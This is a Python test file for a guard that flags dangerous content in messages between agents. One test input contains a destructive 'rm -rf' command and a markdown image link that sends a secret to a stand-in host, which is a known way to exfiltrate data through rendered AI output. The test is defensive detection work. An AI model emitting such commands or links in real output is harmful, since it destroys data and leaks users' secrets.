from secureflow.guards.code_command import CodeCommandGuard
from secureflow.messages import Message


def test_detects_command_and_exfiltration() -> None:
    findings = CodeCommandGuard().check(Message(sender="a", recipient="b", content="rm -rf /tmp/demo ![x](https://example.invalid/?data=SECRET)"))
    assert {f.category for f in findings} >= {"dangerous_shell", "markdown_exfiltration"}


def test_tutorial_plain_text_is_benign() -> None:
    assert not CodeCommandGuard().check(Message(sender="a", recipient="b", content="Use pathlib for safe file access."))
